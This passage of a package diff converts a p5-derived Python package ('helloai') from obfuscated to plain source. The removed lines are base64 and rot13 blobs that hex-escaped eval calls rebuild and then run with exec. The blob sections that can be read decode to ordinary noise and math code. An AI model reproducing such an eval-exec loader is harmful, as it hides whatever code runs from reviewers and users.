KWhVTRtoz9loJSfoUxtp2SgpTkyMPOlLJ5xo20toaIgLzIlYtbXVPNtVQcjLKWuoFOgMJShBvOHnTHtoJIuovO2LJk1MFO0olOvMFO1p2IxVTMipvO0nTHtoz9loJSfVTEcp3ElnJW1qTyiotbtVPNtVPNtVPuxMJMuqJk0plO0olNjXF4XVPNtVQc0rKOyVT1yLJ46VTMfo2S0PtbtVPNtBaOupzSgVUA0MS9xMKL6VSEbMFOmqTShMTSlMPOxMKMcLKEco24tqT8tLzHtqKAyMPOzo3VtqTuyVT5ipz1uoNbtVPNtVPNtVTEcp3ElnJW1qTyiovNbMTIzLKIfqUZtqT8tZFxhPvNtVPN6qUyjMFOmqTEsMTI2BvOzoT9uqNbXVPNtVQclMKE1pz5mBvOOVUWuozEioFOhqJ1vMKVtp2IfMJA0MJDtMaWioFOuVT5ipz1uoPOxnKA0pzyvqKEco24tq2y0nNbtVPNtVPNtVUEbMFOanKMyovN6L29xMGctoJIuozNtLJ5xVQcwo2EyBzOmqTEsMTI2LP4XVPNtVQclqUyjMGbtMzkiLKDXPvNtVPNvVvVXVPNtVUWyqUIlovOlLJ5xYzquqKAmXT1yLJ4fVUA0MS9xMKLcPtbXMTIzVUWuozEioI9mMJIxXUAyMJDcBtbtVPNtVvVvH2I0VUEbMFOmMJIxVUImMJDtqT8tM2IhMKWuqTHtpzShMT9gVT51oJWypaZhPtbtVPNtBaOupzSgVUAyMJD6VSEbMFOlMKS1nKWyMPOmMJIxVUMuoUIyYtbtVPNtBaE5pTHtp2IyMQbtnJ50PvNtVPNvVvVXVPNtVUWuozDhp2IyMPumMJIxXDbXMTIzVUWuozEioFuhqJ0fVUAcrzH9ZFx6PvNtVPNvVvVXVPNtVQNtsvOhqJ0t7VXf7W207W2LVBltyrlVzPOmnKcy6ePp66J8VBh9xrhXyBhYcPNXVPNtVPVvVtbtVPNtnJLtp2y6MFN9CFNkBtbtVPNtVPNtVUWyqUIlovOlLJ5xYaWuozElLJ5aMFtjYPOhqJ0cPvNtVPOyoUAyBtbtVPNtVPNtVPZtZPO+VT51oFQftdmfaoGfaMtt7XPI7VvL6ePFVUAcrzKdfWmecojt672E7WJR64X464hxYtbtVPNtVPNtVT5jYaWuozEioF5lLJ5xnJ50XT51oFjtp2y6MG1mnKcyXDbXPzEyMvOlLJ5xo21spzShM2Hbp3EupaDfVTIhMPx6PvNtVPNvVvVXVPNtVQNtsvOhqJ0t7VXf7W207W2LVBltyrlVzPNXVPNtVPVvVtbtVPNtpzI0qKWhVUWuozDhpzShMUWuozqyXUA0LKW0YPOyozDc'
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+#
+# Part of p5: A Python package based on Processing
+# Copyright (C) 2017-2019 Abhik Pal
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but
+# WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
+# General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program. If not, see <http://www.gnu.org/licenses/>.
+#
+
+import random as rand
+import numpy as np
+
+from .utils import constrain
+from .utils import SINCOS_LENGTH
+from .utils import PRE_COS
+
+__all__ = [
+    # PERLIN NOISE FUNCTIONS
+    'noise', 'noise_detail', 'noise_seed',
+
+    # RANDOM NUMBER GENERATION
+    'random', 'random_uniform', 'random_gaussian', 'random_seed', 'random_range'
+]
+
+# Most of the perlin noise code is based on the original Processing
+# implementation of the noise function. toxi (+ other folks) put a
+# bunch of comments on the Processing version, and I've added them
+# here too for context.
+#
+# All commets that were ported from Processing are prefixed with
+# "#P:"
+#
+#         --- abhikpal (2017-08-04)
+
+# P: PERLIN NOISE
+# P:
+# P: [toxi 040903]
+# P: octaves and amplitude amount per octave are now user controlled via
+# P: the noiseDetail() function.
+# P:
+# P: [toxi 030902]
+# P: cleaned up code and now using bagel's cosine table to speed up
+# P:
+# P: [toxi 030901]
+# P: implementation by the german demo group farbrausch as used in their
+# P: demo "art": http://www.farb-rausch.de/fr010src.zip
+
+# P: Default to medium smooth
+PERLIN_OCTAVES = 4
+
+# P: 50% redution per octave
+PERLIN_FALLOFF = 0.5
+
+PERLIN_YWRAPB = 4
+PERLIN_YWRAP = 1 << PERLIN_YWRAPB
+PERLIN_ZWRAPB = 8
+PERLIN_ZWRAP = 1 << PERLIN_ZWRAPB
+PERLIN_SIZE = 4095
+
+# P: [toxi 031112]
+# P: new vars needed due to recent change of cos table in PGraphics
+PERLIN_COS_TABLE = PRE_COS
+PERLIN_TWO_PI = SINCOS_LENGTH
+PERLIN_PI = PERLIN_TWO_PI
+PERLIN_PI >>= 1
+
+PERLIN = None
+
+
+def noise(x, y=0, z=0):
+    """Return perlin noise value at the given location.
+
+    :param x: x-coordinate in noise space.
+    :type x: float
+
+    :param y: y-coordinate in noise space.
+    :type y: float
+
+    :param z: z-coordinate in noise space.
+    :type z: float
+
+    :returns: The perlin noise value.
+    :rtype: float
+
+    """
+    # TODO (abhikpal, 2017-08-04)
+    #
+    # REFACTOR THIS MESS.
+
+    global PERLIN
+
+    # P: [toxi 031112]
+    # P: now adjusts to the size of the cosLUT used via
+    # P: the new variables, defined above
+    def noise_fsc(i):
+        # P: using bagel's cosine table instead
+        return 0.5 * (1 - PERLIN_COS_TABLE[int(i * PERLIN_PI) % PERLIN_TWO_PI])
+
+    # P: [toxi 031112]
+    # P: noise broke due to recent change of cos table in PGraphics
+    # P: this will take care of it
+    if PERLIN is None:
+        PERLIN = [rand.random() for _ in range(PERLIN_SIZE + 1)]
+
+    x = (-1 * x) if x < 0 else x
+    xi = int(x)
+    xf = x - xi
+
+    y = (-1 * y) if y < 0 else y
+    yi = int(y)
+    yf = y - yi
+
+    z = (-1 * z) if z < 0 else z
+    zi = int(z)
+    zf = z - zi
+
+    r = 0
+    ampl = 0.5
+
+    for i in range(PERLIN_OCTAVES):
+        rxf = noise_fsc(xf)
+        ryf = noise_fsc(yf)
+
+        of = int(xi + (yi << PERLIN_YWRAPB) + (zi << PERLIN_ZWRAPB))
+        n1 = PERLIN[of % PERLIN_SIZE]
+        n1 += rxf * (PERLIN[(of + 1) % PERLIN_SIZE] - n1)
+        n2 = PERLIN[(of + PERLIN_YWRAP) % PERLIN_SIZE]
+        n2 += rxf * (PERLIN[(of + PERLIN_YWRAP + 1) & PERLIN_SIZE] - n2)
+        n1 += ryf * (n2 - n1)
+
+        of += PERLIN_ZWRAP
+        n2 = PERLIN[of & PERLIN_SIZE]
+        n2 += rxf * (PERLIN[(of + 1) % PERLIN_SIZE] - n2)
+        n3 = PERLIN[(of + PERLIN_YWRAP) % PERLIN_SIZE]
+        n3 += rxf * (PERLIN[(of + PERLIN_YWRAP + 1) % PERLIN_SIZE] - n3)
+
+        n2 += ryf * (n3 - n2)
+        n1 += noise_fsc(zf) * (n2 - n1)
+
+        r += n1 * ampl
+        ampl *= PERLIN_FALLOFF
+
+        xi *= 2
+        xf *= 2
+
+        yi *= 2
+        yf *= 2
+
+        zi *= 2
+        zf *= 2
+
+        if xf >= 1:
+            xi = xi + 1
+            xf = xf - 1
+
+        if yf >= 1:
+            yi = yi + 1
+            yf = yf - 1
+
+        if zf >= 1:
+            zi = zi + 1
+            zf = zf - 1
+
+    return r
+
+
+def noise_detail(octaves=4, falloff=0.5):
+    """Adjust the level of noise detail produced by noise().
+
+    :param octaves: The number of octaves to compute the noise for
+        (defaults to 4).
+    :type octaves: int
+
+    :param falloff:
+    :type falloff: float
+
+    :note: For :code:`falloff` values greater than 0.5,
+        :code:`noise()` will return values greater than 1.0.
+
+    """
+    global PERLIN_OCTAVES
+    global PERLIN_FALLOFF
+
+    if octaves > 0:
+        PERLIN_OCTAVES = octaves
+    PERLIN_FALLOFF = constrain(falloff, 0, 1)
+
+
+def noise_seed(seed):
+    """Set the seed value for :code:`noise()`
+
+    By default :code:`noise()` produes different values each time the
+    sketch is run. Setting the :code:`seed` parameter to a constant
+    will make :code:`noise()` return the same values each time the
+    sketch is run.
+
+    :param seed: The required seed value.
+    :type seed: int
+
+    """
+    global PERLIN
+    random_seed(seed)
+    PERLIN = None
+
+
+def random_uniform(high=1, low=0):
+    """Return a uniformly sampled random number.
+
+    :param high: The upper limit on the random value (defaults to 1).
+    :type high: float
+
+    :param low: The lowe limit on the random value (defaults to 0).
+    :type low: float
+
+    :returns: A random number between :code:`low` and :code:`high`.
+    :rtype: float
+
+    """
+    return rand.uniform(low, high)
+
+
+def random_gaussian(mean=0, std_dev=1):
+    """Return a normally sampled random number.
+
+    :param mean: The mean value to be used for the normal distribution
+        (defaults to 0).
+    :type mean: float
+
+    :param std_dev: The standard deviation to be used for the normal
+        distribution (defaults to 1).
+    :type std_dev: float
+
+    :returns: A random number selected from a normal distribution with
+        the given :code:`mean` and :code:`std_dev`.
+    :rtype: float
+
+    """
+    return rand.gauss(mean, std_dev)
+
+
+def random_seed(seed):
+    """Set the seed used to generate random numbers.
+
+    :param seed: The required seed value.
+    :type seed: int
+    """
+    rand.seed(seed)
+
+def random(num, size=1):
+    """
+    0 ~ num 사이의 정수 size개를 뽑는다 
+    """
+    if size == 1:
+        return rand.randrange(0, num)
+    else:
+        # 0 ~ num 사이의 정수값 size개를 뽑아낸다.
+        np.random.randint(num, size=size)
+
+
+def random_range(start, end):
+    """
+    0 ~ num 사이의 정수 
+    """
+    return rand.randrange(start, end)
```

### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

## helloai/utils/time.py

```diff
@@ -1,7 +1,25 @@
+#
+# Part of p5: A Python package based on Processing
+# Copyright (C) 2017-2019 Abhik Pal
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but
+# WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
+# General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program. If not, see <http://www.gnu.org/licenses/>.
+#
+
 import time
 import builtins
 
 
 def millis():
     return int((time.perf_counter() - builtins.start_time) * 1000)
```

## helloai/utils/utils.py

```diff
@@ -1,8 +1,337 @@
-import base64, codecs
-magic = 'IwojIFBhcnQgb2YgcDU6IEEgUHl0aG9uIHBhY2thZ2UgYmFzZWQgb24gUHJvY2Vzc2luZwojIENvcHlyaWdodCAoQykgMjAxNy0yMDE5IEFiaGlrIFBhbAojCiMgVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkKIyBpdCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFzIHB1Ymxpc2hlZCBieQojIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIGVpdGhlciB2ZXJzaW9uIDMgb2YgdGhlIExpY2Vuc2UsIG9yCiMgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4KIwojIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLCBidXQKIyBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBldmVuIHRoZSBpbXBsaWVkIHdhcnJhbnR5IG9mCiMgTUVSQ0hBTlRBQklMSVRZIG9yIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiBTZWUgdGhlIEdOVQojIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgZm9yIG1vcmUgZGV0YWlscy4KIwojIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlCiMgYWxvbmcgd2l0aCB0aGlzIHByb2dyYW0uIElmIG5vdCwgc2VlIDxodHRwOi8vd3d3LmdudS5vcmcvbGljZW5zZXMvPi4KIwoiIiJHZW5lcmFsIHB1cnBvc2UgbWF0aCB1dGlsaXR5IGZ1bmN0aW9ucy4KCiIiIgoKaW1wb3J0IG1hdGgKZnJvbSBtYXRoIGltcG9ydCBjZWlsLCBmbG9vciwgZXhwLCBsb2csIHNxcnQsIG1vZGYKZnJvbSBtYXRoIGltcG9ydCBkZWdyZWVzLCByYWRpYW5zCmZyb20gbWF0aCBpbXBvcnQgc2luLCBjb3MsIHRhbgpmcm9tIG1hdGggaW1wb3J0IGFzaW4sIGFjb3MsIGF0YW4sIGF0YW4yCgppbXBvcnQgbnVtcHkgYXMgbnAKCl9fYWxsX18gPSBbCiAgICAjIFRSSUcgRlVOQ1RJT05TCiAgICAnc2luJywgJ2NvcycsICd0YW4nLCAnZGVncmVlcycsICdyYWRpYW5zJywKCiAgICAjIElOVkVSU0UgVFJJRyBGVU5DVElPTlMKICAgICdhc2luJywgJ2Fjb3MnLCAnYXRhbicsICdhdGFuMicsCgogICAgIyBUUklHIENPTlNUQU5UUwogICAgJ1RXT19QSScsICdQSScsICdIQUxGX1BJJywgJ1FVQVJURVJfUEknLCAnVEFVJywgJ0hBTEZfVEFVJywKCiAgICAjIE1BVEggRlVOQ1RJT05TIEZST00gVEhFIFNUQU5EQVJEIExJQlJBUlkgKGFicyBhbmQgcm91bmQgYXJlCiAgICAjIGF2YWlsYWJsZSBpbiBidWlsdGlucy4pCiAgICAnY2VpbCcsICdmbG9vcicsICdleHAnLCAnbG9nJywgJ3NxcnQnLAoKICAgICMgTUFUSCBGVU5DVElPTlMgREVGSU5FRCBIRVJFCgogICAgJ2NvbnN0cmFpbicsICdsZXJwJywgJ3JlbWFwJywgJ25vcm1hbGl6ZScsICdkaXN0YW5jZScsICdkaXN0JywKICAgICdtYWduaXR1ZGUnLCAnbWFnJywgJ3NxJywgJ2ZyYWN0JywKCiAgICAjIEFOR0xFCiAgICAnYW5nbGUzcCcsCl0KClRXT19QSSA9IDIgKiBtYXRoLnBpClBJID0gbWF0aC5waQpIQUxGX1BJID0gbWF0aC5waSAvIDIuMApRVUFSVEVSX1BJID0gbWF0aC5waSAvIDQuMAoKVEFVID0gMiAqIG1hdGgucGkKSEFMRl9UQVUgPSBtYXRoLnBpCgojIFdlIHdpbGwgYmUgdXNpbmcgdGhlc2UgYSBsb3QsIGp1c3QgcHJlY29tcHV0ZSBhIHdob2xlIGxvdCBvZiBzaW4gYW5kCiMgY29zaW5lIHZhbHVlc'
-love = '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'
-god = 'AgICAgICAgNS4wCgogICAgICAgICA+Pj4gcmVtYXAoNSwgKDAsIDEwKSwgKDAsIDEwMCkpCiAgICAgICAgIDUwLjAKCiAgICAgICAgID4+PiByZW1hcCg1LCAoMCwgMTApLCAoMTAsIDIwKSkKICAgICAgICAgMTUuMAoKICAgICAgICAgPj4+IHJlbWFwKDE1LCAoMTAsIDIwKSwgKDAsIDEwKSkKICAgICAgICAgNS4wCgogICAgOnBhcmFtIHZhbHVlOiBUaGUgdmFsdWUgdG8gYmUgcmVtYXBwZWQuCgogICAgOnBhcmFtIHNvdXJjZV9yYW5nZTogVGhlIHNvdXJjZSByYW5nZSBmb3IgOmNvZGU6YHZhbHVlYAogICAgOnR5cGUgc291cmNlX3JhbmdlOiB0dXBsZQoKICAgIDpwYXJhbSB0YXJnZXRfcmFuZ2U6IFRoZSB0YXJnZXQgcmFuZ2UgZm9yIDpjb2RlOmB2YWx1ZWAKICAgIDp0eXBlIHRhcmdldF9yYW5nZTogdHVwbGUKCiAgICAiIiIKICAgIHMwLCBzMSA9IHNvdXJjZV9yYW5nZQogICAgdDAsIHQxID0gdGFyZ2V0X3JhbmdlCiAgICBTID0gczEgLSBzMAogICAgVCA9IHQxIC0gdDAKICAgIHJldHVybiB0MCArICgodmFsdWUgLSBzMCkgLyBTKSAqIFQKCgpkZWYgbm9ybWFsaXplKHZhbHVlLCBsb3csIGhpZ2gpOgogICAgIiIiTm9ybWFsaXplIHRoZSBnaXZlbiB2YWx1ZSB0byB0aGUgc3BlY2lmaWVkIHJhbmdlLgoKICAgIEV4YW1wbGVzIDo6CgogICAgICAgID4+PiBub3JtYWxpemUoMTAsIDAsIDEwMCkKICAgICAgICAwLjEKCiAgICAgICAgPj4+IG5vcm1hbGl6ZSgwLjMsIDAsIDEpCiAgICAgICAgMC4zCgogICAgICAgID4+PiBub3JtYWxpemUoMTAwLCAwLCAxMDApCiAgICAgICAgMS4wCgogICAgICAgID4+PiBub3JtYWxpemUoMSwgMSwgMTUpCiAgICAgICAgMC4wCgogICAgOnBhcmFtIHZhbHVlOgogICAgOnR5cGUgdmFsdWU6IGZsb2F0CgogICAgOnBhcmFtIGxvdzogVGhlIGxvd2VyIGJvdW5kIGZvciB0aGUgcmFuZ2UuCiAgICA6dHlwZSBsb3c6IGZsb2F0CgogICAgOnBhcmFtIGhpZ2g6IFRoZSB1cHBlciBib3VuZCBmb3IgdGhlIHJhbmdlLgogICAgOnR5cGUgaGlnaDogZmxvYXQKICAgICIiIgogICAgcmV0dXJuIHJlbWFwKHZhbHVlLCAobG93LCBoaWdoKSwgKDAsIDEpKQoKCmRlZiBtYWduaXR1ZGUoeCwgeSwgej0wKToKICAgICIiIlJldHVybiB0aGUgbWFnbml0dWRlIG9mIHRoZSBnaXZlbiB2ZWN0b3IuCgogICAgRXhhbXBsZXMgOjoKCiAgICAgICAgPj4+IG1hZ25pdHVkZSgzLCA0KQogICAgICAgIDUuMAoKICAgICAgICA+Pj4gbWFnbml0dWRlKDIsIDMsIDYpCiAgICAgICAgNy4wCgogICAgICAgID4+PiBtYWduaXR1ZGUoMCwgMCwgMCkKICAgICAgICAwLjAKCiAgICA6cGFyYW0geDogVGhlIHgtY29tcG9uZW50IG9mIHRoZSB2ZWN0b3IuCiAgICA6dHlwZSB4OiBmbG9hdAoKICAgIDpwYXJhbSB5OiBUaGUgeS1jb21wb25lbnQgb2YgdGhlIHZlY3Rvci4KICAgIDp0eXBlIHk6IGZsb2F0CgogICAgOnBhcmFtIHo6IFRoZSB6LWNvbXBvbmVudCBvZiB0aGUgdmVjdG9yIChkZWZhdWx0cyB0byAwKS4KICAgIDp0eXBlIHo6IGZsb2F0CgogICAgOnJldHVybnM6IFRoZSBtYWduaXR1ZGUgb2YgdGhlIHZlY3Rvci4KICAgIDpydHlwZTogZmxvYXQKCiAgICAiIiIKICAgIHJldHVybiBucC5zcXJ0KG5wLnN1bShucC5hcnJheShbeCwgeSwgel0pICoqIDIpKQoKCmRlZiBkaXN0YW5jZShwb2ludF8xLCBwb2ludF8yKToKICAgICIiIlJldHVybiB0aGUgZGlzdGFuY2UgYmV0d2VlbiB0d28gcG9pbnRzLgoKICAgIEV4YW1wbGV'
-destiny = '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'
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+#
+# Part of p5: A Python package based on Processing
+# Copyright (C) 2017-2019 Abhik Pal
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but
+# WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
+# General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program. If not, see <http://www.gnu.org/licenses/>.
+#
+"""General purpose math utility functions.
+
+"""
+
+import math
+from math import ceil, floor, exp, log, sqrt, modf
+from math import degrees, radians
+from math import sin, cos, tan
